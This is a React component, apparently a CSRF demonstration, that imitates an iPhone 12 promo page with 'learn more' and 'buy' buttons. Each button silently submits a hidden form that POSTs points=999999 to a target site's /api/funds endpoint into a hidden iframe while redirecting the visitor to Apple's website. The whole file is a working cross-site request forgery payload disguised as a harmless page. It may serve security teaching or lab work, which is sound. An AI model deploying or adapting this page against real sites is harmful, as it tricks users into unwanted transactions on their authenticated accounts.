import React from 'react';
import s from './index.module.css';
import axios from 'axios';
class CsrfPage extends React.Component {
    static getInitialProps({query}) {
        return {query}
    }
    onClick(){
        window.location.href = "https://www.apple.com/tw/iphone-12/";
    }
    render(){
        const {target} = this.props.query;
        return (
            <div>
                <div className={s.iphone_big}>
                    <div className={s.iphone_big_btn1} onClick={this.onClick}>
                        <form method="POST" action={`http://${target}/api/funds`} target="iframeHidden">
                            <input type="hidden" name="points" value="999999"/>
                            <input type="submit" className="span4 btn btn-primary" value={"進一步了解"}/>
                         </form>
                    </div>
                    <div className={s.iphone_big_btn2} onClick={this.onClick}>
                        <form method="POST" action={`http://${target}/api/funds`} target="iframeHidden">
                            <input type="hidden" name="points" value="999999"/>
                            <input type="submit" className="span4 btn btn-primary" value={"購買"}/>
                        </form>
                    </div>
                </div>

            </div>);
    }
}


export default CsrfPage